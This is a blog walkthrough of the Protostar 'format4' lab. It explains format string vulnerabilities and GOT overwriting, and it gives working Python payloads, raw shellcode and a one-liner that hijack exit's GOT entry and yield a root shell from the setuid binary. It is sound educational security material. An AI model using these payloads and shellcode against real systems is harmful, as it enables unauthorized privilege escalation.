---
layout: post
title: Protostar - Format 4
description: >
  Walkthrough of a simple binary with format strings
image: /assets/img/posts/protostar_format4.png
categories: [BinaryExploitation]
tags: [format string]
---
# Protostar - Format 4

## Table of contents

* list
{:toc}

## Target Binary

| Name           | Description                                               |
|----------------|-----------------------------------------------------------|
| File           | format4 (https://exploit-exercises.lains.space/protostar/) |
| OS             | GNU/Linux 2.6.18                                          |
| Format         | setuid ELF 32-bit LSB executable                          |
| PIE            | Not enabled                                               |
| Stack canaries | Not enabled                                               |
| NX             | Not enabled                                               |
| Symbol data    | Available                                                 |

## Walkthrough

### Analyze file

File analysis was performed with radare2. In this case the exploited binary is in a VM accessible through SSH. Unfortunately, this VM does not have radare2 installed (as most of the possible real targets). In order to extract the binary the following command was issued from the host machine:

```sh
ssh user@<ip address> 'cat /opt/protostar/bin/format4' > ~/Downloads/format4
```
or by using SCP:
```sh 
scp user@<ip address>:/opt/protostar/bin/format4 ~/Downloads/format4
```

Now that the binary was extracted from the remote VM, it is possible to analyze it with radare2. In order to dump the file information, the `iI` command can be used inside radare2. 

```
$ r2 format4 
 -- Use '-e bin.strings=false' to disable automatic string search when loading the binary.
[0x08048400]> iI
arch     x86
baddr    0x8048000
binsz    23472
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (Debian 4.4.5-8) 4.4.5 GCC: (Debian 4.4.5-10) 4.4.5
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    no
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```

Some interesting characteristics of this binary are that symbols are present (stripped = false), the stack is not protected against execution (nx = false), code is not relocatable (pic = false) and there are no stack canaries (canary = false). All of these are common counter-measures against binary exploitation. For more information on these, and alternative options for extracting this information see [Protostar - stack5](./2020-05-09-protostar-stack5.md).

**NOTE:** For more information on `iI` output see this [page](https://dzhy.dev/2020/02/28/Understanding-rabin2-output/).

### Analyze symbols

The next step is to analyze the functions present in the binary. This can be achieved easily as symbols are present in the executable. To get a list of the present functions `afl` will be used (note that `aaa` needs to be executed prior to this command).

```sh
[0x08048400]> aaa
...
[0x08048400]> afl
0x08048400    1 33           entry0
0x080483ac    1 6            sym.imp.__libc_start_main
0x08048430    6 85           sym.__do_global_dtors_aux
0x08048490    4 35           sym.frame_dummy
0x080485a0    4 42           sym.__do_global_ctors_aux
0x08048530    1 5            sym.__libc_csu_fini
0x080485cc    1 28           sym._fini
0x08048540    4 90           sym.__libc_csu_init
0x080484b4    1 30           sym.hello
0x080483dc    1 6            sym.imp.puts
0x080483bc    1 6            sym.imp._exit
0x080484d2    1 66           sym.vuln
0x0804839c    1 6            sym.imp.fgets
0x080483cc    1 6            sym.imp.printf
0x080483ec    1 6            sym.imp.exit
0x0804859a    1 4            sym.__i686.get_pc_thunk.bx
0x08048514    1 15           main
0x0804834c    3 48           sym._init
0x0804838c    1 6            loc.imp.__gmon_start
```

From this list it is possible to observe a couple of interesting potential vulnerable functions: `fgets` and `printf` can be vulnerable if used incorrectly.  Besides these functions, it is possible to see some base level functions such as `sym.hello` and `sym.vuln`. 

### Analyze program flow

Now that there is some idea on the symbols involved, the flow of the program will be analyzed. Radare2 is a decompiler tool has great features for analyzing a binary (more information on this is covered in a previous [post](./2020-05-09-protostar-stack5.md). To start the analysis, the main function will be disassembled. 

```
[0x08048400]> pdf @ main
            ; DATA XREF from entry0 @ 0x8048417
┌ 15: int main (int argc, char **argv, char **envp);
│           0x08048514      55             push ebp
│           0x08048515      89e5           mov ebp, esp
│           0x08048517      83e4f0         and esp, 0xfffffff0
│           0x0804851a      e8b3ffffff     call sym.vuln
│           0x0804851f      89ec           mov esp, ebp
│           0x08048521      5d             pop ebp
└           0x08048522      c3             ret
[0x08048400]> 
```

Nothing much is happening in `main`, only the function prolog, a call into `symvuln` and the function epilog. The next step would be to disassemble `sym.vuln`.

```
[0x08048400]> pdf @ sym.vuln
            ; CALL XREF from main @ 0x804851a
┌ 66: sym.vuln ();
│           ; var char *format @ ebp-0x208
│           ; var int32_t size @ esp+0x4
│           ; var FILE *stream @ esp+0x8
│           0x080484d2      55             push ebp
│           0x080484d3      89e5           mov ebp, esp
│           0x080484d5      81ec18020000   sub esp, 0x218
│           0x080484db      a130970408     mov eax, dword [obj.stdin]  ; loc._edata
│                                                                      ; [0x8049730:4]=0
│           0x080484e0      89442408       mov dword [stream], eax     ; FILE *stream
│           0x080484e4      c74424040002.  mov dword [size], 0x200     ; [0x200:4]=-1 ; 512dec ; int size
│           0x080484ec      8d85f8fdffff   lea eax, [format]
│           0x080484f2      890424         mov dword [esp], eax        ; char *s
│           0x080484f5      e8a2feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x080484fa      8d85f8fdffff   lea eax, [format]
│           0x08048500      890424         mov dword [esp], eax        ; const char *format
│           0x08048503      e8c4feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x08048508      c70424010000.  mov dword [esp], 1          ; int status
└           0x0804850f      e8d8feffff     call sym.imp.exit           ; void exit(int status)
```

This seems to be a more interesting function. It will read 0x200 characters from the stdin stream and store it into the local variable `format` located at (ebp-0x208). From this information it is possible to know that `fgets` cannot be used to exploit the system, as it will only read a maximum of 0x200 characters while the local variable is 0x208 bytes away from the base of the stack frame (0x200 bytes won't be enough to overflow and overwrite the return pointer which is 0x20c bytes away).

What happens next is interesting. The function is passing the recently read string from stdin into printf as the first argument (the format argument), which is dangerous and can be exploited.

### Identifying the vulnerability 

A format string exploit can be used to read and write arbitrary memory addresses. This kind of exploit is uncommon nowadays since compilers and static analysis tools catch this programming mistake easily. But some exploitation techniques shown later on in this post can be used in other scenarios other than these kinds of exploits.

`printf` will format a string based on a specific syntax and given arguments to later send it to stdout (printed to the shell). More information on the function can be found [here.](https://www.tutorialspoint.com/c_standard_library/c_function_printf.htm)

`printf` is an interesting function in the sense that can take [varadic arguments](https://en.cppreference.com/w/c/variadic). This means that you can pass a variable number of arguments to the function. In a regular situation, `printf` will take one additional arguments for each format specifier `%`. (A list of format specifiers can be found [here](http://www.cplusplus.com/reference/cstdio/printf/).

As with any other function in x86-32bit, the arguments are passed by storing them in the stack. So for example, a `printf` that is intended to output a decimal to stdout would look like this:

```
printf("%d", 1994);
```

The stack would look like this when the function is executed:

```
                        +---------------------+ 0x0
                        |                     |
                        |                     |
                    +-------------------------+
                    |   |                     |
                    |   |                     |
                    |   |   Local variables   |
                    |   +---------------------+
printf() stack ---> |   |                     |
frame               |   |   Stored EBP        |
                    |   +---------------------+
                    |   |                     |
                    |   |   Return pointer    |
                    +-------------------------+
                    |   |                     |
                    |   |    ebp + 0x208      | <------+ printf arg0
                    |   +--------+------------+
                    |   |                     |
                    |   |    1994             | <------+ printf arg1
                    |   +---------------------+
                    |   |                     |
                    |   |    0xdeadbeef       |
                    |   +---------------------+ <-------- ebp-0x208 where the
                    |   |                     |           format string is
vuln() stack -----> |   |   "%d"              |           stored
frame               |   |                     |
                    |   +---------------------+
                    |   |                     |
                    |   |                     |
                    |   +---------------------+
                    |   |                     |
                    |   |  Stored EBP         |
                    |   +---------------------+
                    |   |                     |
                    |   |   Return pointer    |
                    +---+---------------------+ 0xffffffff
```

As you can appreciate, the pointer to the format string "%d" is stored before the start of `printf()` stack's frame, followed by the number `1994` which the function intends to print.

The vulnerability of the function relies on passing a string with more format modifiers than arguments, as the function will keep reading from the stack even if not real arguments were passed.

Take this example:

```
printf("%d%x", 1994);
```

`printf` expects to output two integer variables, as "%d%x" was defined (one formatted as decimal and one as hexadecimal), but only one additional variable was passed. 

Based on our diagram above, the next position in the stack for a `printf` argument would be the space with the 0xdeadbeef value. Although that was never passed as an argument. It is possible to pass even more format modifiers and continue reading from the stack (at least a format that fits in 0x200 characters or less, as is the number of characters read by `fgets`).

`printf` does not only allows you to read memory, but write as well. It is possible to use the "%n" format modifier to write the current outputted characters to a given address. So for example:

```
printf("ABCDEFG%n", &var);
```

Will store a 7 in the variable `var`.

Additional to this, there is an interesting feature that allows you to select the argument that you want to use for a given format. This is done by using the `$`, which is a direct parameter access modifier. This is exemplified as follows:

```
printf("%8x, %1$8x", 0x12ab34cd);
```

In this case with "%8x" it is indicated to the `printf` to output the first argument with a padding of 8 characters. Then with "%1\$8x" the function is requested to print the argument in position 1 (as stated with `1$`) again with an 8 character padding. The result of the `printf` will be "12ab34cd, 12ab34cd" as the function was asked to print the first argument twice. This could allow for printing arbitrary positions in the stack, by changing the offset of what is meant to be printed with the `$` modifier.

Knowing that `printf` can do arbitrary reads and writes, it allows for different exploitation vectors.

### Exploitation

It is possible to confirm if there is a format string vulnerability by adding format specifiers and then see if it is possible to read from the stack memory:

```sh
$ ./format4 
AAAA%x%x%x%x
AAAA200f7fb05c0f08162ca4141414
```

The stack looks as follows:

```
                        +---------------------+ 0x0
                        |                     |
                        |                     |
                    +-------------------------+
                    |   |                     |
                    |   |                     |
                    |   |   Local variables   |
                    |   +---------------------+
printf() stack ---> |   |                     |
frame               |   |   Stored EBP        |
                    |   +---------------------+
                    |   |                     |
                    |   |   Return pointer    |
                    +-------------------------+
                    |   |                     |
                    |   |    ebp + 0x208      | <------+ pointer to the format string
                    |   +---------------------+
                    |   |                     | 
                    |   |    0x200            | 
                    |   +---------------------+
                    |   |                     |
                    |   |    0xf7fb05c0       | 
                    |   +---------------------+ 
                    |   |                     |           
vuln() stack -----> |   |    0xf08162ca       |           
                    |   +---------------------+ <-------- ebp-0x208 where 
frame               |   |  "AAAA%x%x%x%x"     |  the format string is stored
                    |   |                     |
                    |   |                     |
                    |   |                     |
                    |   +---------------------+
                    |   |                     |
                    |   |  Stored EBP         |
                    |   +---------------------+
                    |   |                     |
                    |   |   Return pointer    |
                    +---+---------------------+ 0xffffffff
```

The format specifiers are making `printf` read from the stack. As shown before, in the stack diagram, by using 4 `%x` modifiers it read 4 words from the stack, reaching into the start of the format string.

Using direct parameter access can simplify format string exploits. A direct parameter access specifier is denoted with the dollar sign `$` such as shown in the example below:

```C
printf("The 5th element is: %5$d and the 1st element is: %1$d", 100, 200, 300, 400, 500);
/*
* Result: 
* The 5th element is: 500 and the 1st element is: 100
*/
```

Direct parameter access can be used in this example. Instead of writing`AAAA%x%x%x%x` to print the first four words, the payload can be replaced to `AAAA%4$x` to access only the fourth parameter and print it in hexadecimal format:

```sh 
$ ./format4
AAAA%4$x
AAAA41414141
```

Now that the vulnerability has been confirmed, the next step is to analyze the rest of the program to understand how this vulnerability can be abused. An interesting function is the one called `hello`:

```sh 
[0x08048400]> afl
0x08048400    1 33           entry0
0x080483ac    1 6            sym.imp.__libc_start_main
0x08048430    6 85           sym.__do_global_dtors_aux
0x08048490    4 35           sym.frame_dummy
0x080485a0    4 42           sym.__do_global_ctors_aux
0x08048530    1 5            sym.__libc_csu_fini
0x080485cc    1 28           sym._fini
0x08048540    4 90           sym.__libc_csu_init
0x080484b4    1 30           sym.hello ; Interesting function
0x080483dc    1 6            sym.imp.puts
0x080483bc    1 6            sym.imp._exit
0x080484d2    1 66           sym.vuln
...
[0x08048400]> 
```

After inspecting the function, it is possible to see a "winning" string:

```sh
[0x0804838c]> pdf @ 0x080484b4
 30: sym.hello ();
           0x080484b4      55             push ebp
           0x080484b5      89e5           mov ebp, esp
           0x080484b7      83ec18         sub esp, 0x18
            ; Winning string:
           0x080484ba      c70424f08504.  mov dword [esp], str.code_execution_redirected__you_win ; [0x80485f0:4]=0x65646f63 ; "code execution redirected! you win" ; const char *s
           0x080484c1      e816ffffff     call sym.imp.puts           ; int puts(const char *s)
           0x080484c6      c70424010000.  mov dword [esp], 1          ; int status
           0x080484cd      e8eafeffff     call sym.imp._exit          ; void _exit(int status)
```

In order to redirect execution into `hello`, the `vuln` function must be abused through `printf`. But there is a problem, `vuln`  explicitly calls `exit` at the end of its execution; i.e, it never returns to `main` so even if the return pointer of `vuln` is modified through this attack, it will not work to control the flow of the program.

#### Hijack control flow by overwriting the GOT

Executables often use functions contained in shared libraries such as libC (the C standard libray). Programs use a table to reference such functions external to the binary itself. This table is called the procedure linkage table (*PLT*). The PLT table contains jump instructions that redirect the execution to the body of the corresponding functions. Every time a program calls a function in a shared library, it will pass the control to the PLT, which will resolve the address and redirect execution. 

`objdump` can be used to explore the PLT:

```sh
$ objdump -d -j .plt ./format4

./format4:     file format elf32-i386

Disassembly of section .plt:

0804837c <.plt>:
 804837c:    ff 35 04 97 04 08        pushl  0x8049704
 8048382:    ff 25 08 97 04 08        jmp    *0x8049708
 8048388:    00 00                    add    %al,(%eax)
    ...

0804838c <__gmon_start__@plt>:
 804838c:    ff 25 0c 97 04 08        jmp    *0x804970c
 8048392:    68 00 00 00 00           push   $0x0
 8048397:    e9 e0 ff ff ff           jmp    804837c <.plt>

0804839c <fgets@plt>:
 804839c:    ff 25 10 97 04 08        jmp    *0x8049710
 80483a2:    68 08 00 00 00           push   $0x8
 80483a7:    e9 d0 ff ff ff           jmp    804837c <.plt>

080483ac <__libc_start_main@plt>:
 80483ac:    ff 25 14 97 04 08        jmp    *0x8049714
 80483b2:    68 10 00 00 00           push   $0x10
 80483b7:    e9 c0 ff ff ff           jmp    804837c <.plt>

080483bc <_exit@plt>:
 80483bc:    ff 25 18 97 04 08        jmp    *0x8049718
 80483c2:    68 18 00 00 00           push   $0x18
 80483c7:    e9 b0 ff ff ff           jmp    804837c <.plt>

080483cc <printf@plt>:
 80483cc:    ff 25 1c 97 04 08        jmp    *0x804971c
 80483d2:    68 20 00 00 00           push   $0x20
 80483d7:    e9 a0 ff ff ff           jmp    804837c <.plt>

080483dc <puts@plt>:
 80483dc:    ff 25 20 97 04 08        jmp    *0x8049720
 80483e2:    68 28 00 00 00           push   $0x28
 80483e7:    e9 90 ff ff ff           jmp    804837c <.plt>

080483ec <exit@plt>:       ; Function called at the end of the vuln function
 80483ec:    ff 25 24 97 04 08        jmp    *0x8049724        
 80483f2:    68 30 00 00 00           push   $0x30
 80483f7:    e9 80 ff ff ff           jmp    804837c <.plt>

```

As shown above, one of these results is associated to the function `exit` that is called at the end of the `vuln` function. If the jump in the PLT was somehow controlled, it can be abused to redirect the execution to the `hello` function instead of `exit`. Unfortunately, the PLT section is set as read-only:

```sh 
$ objdump -h ./format4
 10 .rel.plt      00000038  08048314  08048314  00000314  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
```

By further inspecting the function `exit@plt` at `0x080483ec`, it can be observed that the first jump instruction isn't jumping to a predefined address but to an address stored in a different memory location (`0x8049724`):

```sh
080483ec <exit@plt>:    
 80483ec:    ff 25 24 97 04 08        jmp    *0x8049724   ; Pointer (*) to 0x8049724
 80483f2:    68 30 00 00 00           push   0x30
 80483f7:    e9 80 ff ff ff           jmp    804837c <.plt>
```

This address is located at another memory section. The section is called *GOT* (Global Offset Table) and favorably it has writing permissions:

```sh 
 21 .got          00000004  080496fc  080496fc  000006fc  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 22 .got.plt      00000028  08049700  08049700  00000700  2**2
                  CONTENTS, ALLOC, LOAD, DATA
```

The way the PLT works is that it is used as a trampoline. The first time a program calls an external function, its address is looked up by the loader and stored in GOT, and then the control flow is redirected to the intended function. Subsequent calls to the same function can directly jump into it, since its address was already stored in GOT the first time. This operation is called *Lazy Binding*. 

**NOTE**: GOT will initially have the address to the operation that performs the *Lazy Binding*.

```sh 
080483ec <exit@plt>:    
 80483ec:    ff 25 24 97 04 08        jmp    *0x8049724       ; Jumps to the function if already loaded, otherwise jumps to the loader (next instruction)
 80483f2:    68 30 00 00 00           push   0x30            ; Instruction executed to perform the Lazy Binding, it is only executed the first time exit function is called 
 80483f7:    e9 80 ff ff ff           jmp    804837c <.plt>   ; Instruction executed to perform the Lazy Binding, it is only executed the first time exit function is called
```

Lazy Binding can be summarized in these diagrams:

First time an external function is called:

```
Program                CODE                                  GOT
+---------------+      +------------------+                +-----+
| ...           |      | Loader           <----+       +-->+ ... |
| call exit     +--+   | code             +------------+   +--+--+
| ...           |  |   | ---- PLT --------|    |              |
+---------------+  +-->+ jmp [exit@GOT]   +--+ |              |
                       | push 0x30        <--| |      function|code
                       | jmp 0x804837c    +----+           +--v---+
                       | ...              |                | ...  |
                       +------------------+                +------+

```

Subsequent calls to the function:

``` 
Program                CODE                                  GOT
+---------------+      +------------------+                +-----+
| ...           |      | Loader           |  +------------>+ ... |
| call exit     +--+   | code             |  |             +--+--+
| ...           |  |   | ---- PLT --------|  |                |
+---------------+  +-->+ jmp [exit@GOT]   +--+                |
                       | push 0x30        |           function|code
                       | jmp 0x804837c    |                +--v---+
                       | ...              |                | ...  |
                       +------------------+                +------+
```
 
Knowing this, it is possible to hijack the execution flow by overwriting the GOT entry of a function that will be called later on.

As we have seen above, it is possible to **read** from memory, which is good to leak memory, but a way to **write** into memory is needed to abuse the vulnerability and redirect code execution. Luckily, as stated in the previous section, a format specifier can be used to write: `%n`. Using `%n` allows to write the number of bytes from the beginning to the string to where the specifier is in place, for instance:


```c
int count = 0;
printf("whatever %n you say\n", &count);
printf("count = %d\n", count);
```

```c
whatever you say
count = 9
```

In this example, the count of characters written is being stored in the `count` variable.

Under this premise, the next step is to create an exploit that can write to a specified memory address, in this case, to the address containing the `exit` GOT entry.

 ```python
 import struct

exit_fnc = 0x8049724 # exit actual address in the GOT

payload = struct.pack("I",exit_fnc) # Convert address of exit from Big-endian to Little-endian
payload += "%4$n"

print(payload)
 ```

```sh
$./format4_string.py > /tmp/format4
```

For this test, the program must be loaded in debug mode and set some breakpoints to confirm that the content of `exit` (`0x8049724`) is being overwritten:

```sh 
$ r2 -R stdin=/tmp/format4 -d format4
...
[0xf7fd6c70]> db 0x08048500 ; Breakpoint before the vulnerable printf
[0xf7fd6c70]> db 0x08048508 ; Breakpoint after the vulnerable printf
[0xf7fd6c70]> dc            ; Continue the execution of the program
hit breakpoint at: 8048500

[0x8048500]> px @ 0x8049724
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x08049724  f283 0408 0000 0000 0000 0000 c005 fbf7  ................ ; The content of 0x08049724 (exit) is 0x080483f2
...
[0x08048500]> dc           ; Continue the execution of the program
$�.
hit breakpoint at: 8048508
[0x08048508]> px @0x8049724
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x08049724  0400 0000 0000 0000 0000 0000 c005 fbf7  ................ ; The content of 0x08049724 (exit) has been modified to 0x00000004
```

**NOTE**: Rarun2 (`-R`) is a tool allowing to set up a specified execution environment. In this case a rarun2 rule is defined to tell the program that the input of the program must be taken from what is in the file `/tmp/format4`*

The content of `exit`'s GOT entry has been successfully modified, the next step is to overwrite its content with the address of `hello`. One additional strategy that can facilitate the exploitation of a format string is to use a short write. A *short* is a two-byte word and there is a format specifier that allows us to deal with *shorts* (`h`). Since the address of `hello` is formed by 4 bytes, it can be divided into two short writes one to `0x08049724` and another to `0x08049726`:

```python
import struct

exit_fnc = 0x8049724

payload = struct.pack("I",exit_fnc)
payload += "%4$hn"                        #Using hn to write a short

print(payload)
```

```sh 
$ python format4_string.py > /tmp/format4
$ r2 -R stdin=/tmp/format4 -d format4
...
[0xf7fd6c70]> aaa
...
[0xf7fd6c70]> dcu main
Continue until 0x08048514 using 1 bpsize
hit breakpoint at: 8048514
[0x08048514]> db 0x08048508
[0x08048514]> dc
$�.
hit breakpoint at: 8048508
[0x08048508]> px @0x8049724
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x08049724  0400 0408 0000 0000 0000 0000 c005 fbf7  ................    ; The content of 0x08049724 (exit) has been modified to 0x08040004 (2 bytes were modified)
```

As shown above, this time only the first 2 bytes from the original address `0x080483f2` were modified, resulting in `0x08040004` (`83f2` was replaced with `0004`). The address `0x08049724` will be filled with the LSB (least significant bytes) of the address of the `hello` function and the  address `0x08049726` will be filled with the MSB (most significant bytes), and it should look as follow:

```
exit = 0x8049724 
hello = 0x080484b4

0x08049724 -> 84b4
                      = 0x080484b4 
0x08049726 -> 0804
```

Since the MSB of `hello` (`0x080484b4`) is the same as the MSB currently stored in `exit`'s GOT entry (`0x080483f2`), it does not need to be overwritten. Hence, the LSB are the only ones that need to be modified. Using the python exploit from above it was possible to modify the LSB to 0x0004. The next step is to calculate the number to be written into the LSB to make it equal to the LSB of `hello` (`0x84b4`), this can be achieved making a subtraction of `0x84b4 - 0x4` (the LSB intended value minus the characters already written by the `printf`):

```sh
[0x08048508]> ? 0x84b4 - 0x4
int32   33968
uint32  33968
hex     0x84b0
```

Therefore, the number `33968 dec` needs to be written into the address `0x080484b4`:

```python
import struct

exit_fnc = 0x8049724

payload = struct.pack("I",exit_fnc)
payload += "%33968x%4$hn"  #0x84b4 - 0x4 = 0x84b0 = 33968 dec

print(payload)
```

```sh 
$./format4_string.py > /tmp/format4
$ r2 -R stdin=/tmp/format4 -d format4
...
[0xf7fd6c70]> aaa
...
[0xf7fd6c70]> dcu main
Continue until 0x08048514 using 1 bpsize
hit breakpoint at: 8048514
[0x08048514]> dc
$�
...
                                        200
code execution redirected! you win
[0xf7fd5059]> 
```
#### Obtaining a shell 
 
In previous [posts](./2020-05-18-protostar-stack7.md) it was described how to include shellcode as part of the payload and hijack the control flow of the program to execute it. In this case, it is possible to do so as well, since the stack is executable (`nx` protection is disabled), as long as it can fit in the requested string (which size is of 0x200 characters). There will be cases when this is not possible, so an alternative strategy will be shown.

As mentioned in this [post](./2020-05-09-protostar-stack5.md), the stack contains environment variables from where the binary was executed. If we add a variable to the environment containing the shellcode it will be present in the stack of any executable ran afterward from that shell.

```
user@protostar:~$ export shellcode="shellcode can go here"
```

By analyzing the stack with `gdb` it can be seen that the variable is present:

```
(gdb) x/1000s $esp
...
0xbffff963:     "/opt/protostar/bin/format4"
0xbffff97e:     "USER=user"
0xbffff988:     "SSH_CLIENT=192.168.86.100 50956 22"
0xbffff9ab:     "MAIL=/var/mail/user"
0xbffff9bf:     "SHLVL=1"
0xbffff9c7:     "HOME=/home/user"
0xbffff9d7:     "SSH_TTY=/dev/pts/1"
0xbffff9ea:     "LOGNAME=user"
0xbffff9f7:     "_=/usr/bin/gdb"
0xbffffa06:     "COLUMNS=130"
0xbffffa12:     "shellcode=shellcode can go here"
0xbffffa32:     "TERM=xterm-256color"
```

Depending on the environment variables present, the position of the shellcode variable can move, making it harder to choose an address to redirect execution to. But what if all the environment variables were controlled? This is possible since the execution of the binary is controlled locally. So a function such as [`execvpe`](https://linux.die.net/man/3/execvpe) can be used to only pass our shellcode variable and have a more deterministic behavior.

The following python script was used to achieve this:

```python
import os

environ = dict(S="\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80")

args = ['./format4']

os.execvpe('./format4', args, environ) 
```

The used shellcode was authored by bolonobolo, and the source can be found [here](https://www.exploit-db.com/exploits/47513).

By evaluating the stack with gdb again, it is possible to see that the only variable present now is the shellcode.

**NOTE:** As `setuid` is set on the binary, a copy of it is required. This is done in order to launch it as the current user and be able to attach gdb.

```
user@protostar:~$ ps au
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
user      1999  0.0  0.0   1532   296 pts/0    S+   05:10   0:00 ./format4
user      2001  0.0  0.0   3868  1012 pts/1    R+   05:10   0:00 ps au
```

```
(gdb) attach 1999
Attaching to process 1999
Reading symbols from /home/user/format4...done.
...
(gdb) x/1000s $esp
...
0xbfffffcc:     "./format4"
0xbfffffd6:     "S=\231\367\342\215\b\276//sh\277/binQVW\215\034$\260\v̀"
0xbffffff2:     "./format4"
0xbffffffc:     ""
0xbffffffd:     ""
0xbffffffe:     ""
0xbfffffff:     ""
```

As the variable is stored almost at the top of the stack (stack starts at 0xbfffffff), it is safe to asume that our variable will always be stored in 0xbfffffd6. And the shellcode payload would start two bytes from there (to acommodate the string "S="). This can be verified by dumping the hexadecimal values:

```
(gdb) x/10x 0xbfffffd8
0xbfffffd8:    0x8de2f799    0x2f2fbe08    0x2fbf6873    0x516e6962
0xbfffffe8:    0x1c8d5756    0xcd0bb024    0x2f2e0080    0x6d726f66
0xbffffff8:    0x00347461    0x00000000
```

**NOTE:** System is little-endian, so bytes are written backward (LSB first).

Now that the desired target address is known (`0xbfffffd8`), the next step is to overwrite the `exit` GOT entry to point to it. This is done with the following format string payload.

```
"\x26\x97\x04\x08\x24\x97\x04\x08%49143x%4$hn%16345x%5$hn"
```

`exit` GOT entry is stored in 0x08049724, as stated in the previous section. An address in this architecture is represented by 4 bytes, so two short (2 byte) writes are used. The payload can be broken as:

```
\x26\x97\x04\x08     => 0x0804097026 Write target address

\x24\x97\x04\x08     => 0x0804097024 Write target address
                     => At this point 8 characters have been written
                     
%49143x              => Write 49143 additional characters = 0xBFFF

%4$hn                => Write a short with the number of the outputted chars
                     => into the 4th stack space value (contains 0x0804097026)
                     
%16345x              => Write 16345 additional characters = 0xFFD8

%5$hn                => Write a short with the number of the outputted chars
                     => into the 4th stack space value (contains 0x0804097024)
```

In order to execute the exploit, the crafted string is passed as stdin into the python script that launches the vulnerable executable with the environment containing the shellcode.

```
(python -c 'print("\x26\x97\x04\x08\x24\x97\x04\x08%49143x%4$hn%16345x%5$hn")'; cat) | python ~/py.py 
<white spaces>200<whitespaces>b7fd8420
whoami
root
```

**NOTE:** `cat` was used to keep the stdin open for passing commands to our shell.
**NOTE:** The original binary is now executable to take advantage of the `setuid` property and gain root access.
